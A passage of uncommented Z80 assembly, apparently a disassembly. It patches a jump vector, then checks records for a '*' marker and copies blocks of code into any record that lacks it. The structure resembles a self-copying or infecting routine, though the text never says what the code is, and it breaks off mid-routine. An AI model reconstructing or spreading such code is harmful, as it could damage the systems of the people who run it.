	LD	A,(LF270)
	LD	DE,(LF271)
	LD	(HL),A
	INC	HL
	LD	(HL),E
	INC	HL
	LD	(HL),D
	INC	HL
	LD	(LF271),HL
	LD	A,0C3H
	LD	(LF270),A
LDED4:	
	LD	HL,L1F31
	LD	(LC02B),HL
	LD	HL,L11F5
	LD	(LC02D),HL
	LD	HL,LC09D
	LD	(LC02F),HL
	JP	L5A21
LDEE9:	
	PUSH	BC
	PUSH	DE
	PUSH	IX
	PUSH	HL
	CP	7
	JR	NZ,LDF42
	LD	A,(IX+03H)
	CP	2
	JR	NZ,LDF42
	LD	A,D
	AND	A
	JR	NZ,LDF42
	LD	E,0
	LD	B,1
	LD	C,(IX+01H)
	LD	A,(LF2E1)
	AND	1
	CALL	L4010
	JR	C,LDF42
	POP	HL
	POP	IX
	PUSH	IX
	PUSH	HL
	LD	DE,2BH
	ADD	HL,DE
	LD	A,(HL)
	CP	'*'
	JR	Z,LDF42
	LD	C,2
	LD	B,0
LDF21:	
	LD	(HL),0
	INC	HL
	DJNZ	LDF21
	DEC	C
	JR	NZ,LDF21
	POP	DE
	PUSH	DE
	LD	HL,L7405
	LD	C,0C3H
	LDIR
	EX	DE,HL
	LD	C,'='
	ADD	HL,BC
	EX	DE,HL
	PUSH	DE
	LD	HL,(LF349)
	LD	BC,0100H
	LDIR
	JR	LDF4C
LDF42:	
	POP	HL
	POP	IX
	POP	DE
	POP	BC
	RET
	RET
	RET
	JR	LDEE9
LDF4C:	
	POP	HL
	INC	(HL)
	POP	HL
	PUSH	HL
	LD	C,'+'
	ADD	HL,BC
	LD	(HL),'*'
